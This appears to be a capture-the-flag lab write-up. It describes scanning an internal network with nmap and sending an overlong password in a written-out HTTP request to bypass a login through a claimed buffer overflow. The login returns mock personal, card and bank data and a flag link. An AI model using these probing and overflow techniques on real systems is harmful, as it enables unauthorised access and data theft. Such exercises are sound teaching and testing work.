# Attack 4

## Background

This attack was done after connecting to the internal network. There was a vulnerability on a login page on one of the hosts on the internal network which had a picture of water flowing over. This strongly suggested that a buffer overflow attack could be performed.

## Solution

By performing a portscan on the internal network with `nmap -sC -sV 10.13.13.0/24` I discovered that the host `10.13.13.254` had a HTTP server running. This webpage had another login field.

There was no visible result when inputting data here, but utilizing Burpsuite it was possible to get a good view on the process, packet by packet.

Sending longer and longer inputs I noticed it sometimes faulted on 128 bytes. By making the 128th byte a "1" which is usually the integer representation for the True boolean I managed to evaluate a required boolean to True. Sending the following request:
```HTTP
POST /login HTTP/1.1
Host: 10.13.13.254
Content-Length: 49

{"username":"jonas.dahle","password":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}
```
Resulted in the following mock data:
```json
{
  "name": "Jonas Dahl",
  "email": "jonas.dahl@regjeringen.no",
  "address": {
    "street": "Regjeringsgata 16",
    "city": "Oslo",
    "postal_code": "1111",
    "country": "Norway"
  },
  "phone": "+47 123 45 678",
  "birthdate": "1985-06-15",
  "gender": "Male",
  "national_id": "15068512345",
  "passport_number": "N12345678",
  "nationality": "Norwegian",
  "occupation": "Technical Officer",
  "company": {
    "name": "Regjeringen",
    "address": {
      "street": "Regjeringsgata 16",
      "city": "Oslo",
      "postal_code": "1111",
      "country": "Norway"
    },
    "phone": "+47 987 65 432",
    "industry": "Government",
    "position": "Technical Officer",
    "department": "Technical and Infrastructure",
    "start_date": "2010-05-01",
    "manager": "Ingrid Nilsen",
    "manger_username": "ingridnilsen"
  },
  "credit_card": {
    "type": "Visa",
    "number": "4111 2222 3333 4444",
    "expiration": "12/26",
    "cvv": "234",
    "cardholder_name": "Jonas Dahl"
  },
  "bank_account": {
    "bank_name": "Statens Bank",
    "account_number": "1234.56.78910",
    "iban": "NO1234567890123",
    "swift_bic": "STBANOXX"
  },
  "hidden_details": {
    "security_question": "Hva var navnet på din første lærer?",
    "security_answer": "Frøken Andersen",
    "pin": "5678",
    "mother_maiden_name": "Larsen"
  },
  "flag": "Dropbox is the flag :)",
  "dropbox": "https://dropbox.internal.regjeringen.uiaikt.no/"
}
```
From here, the important information for the next attack is the dropbox link at the bottom.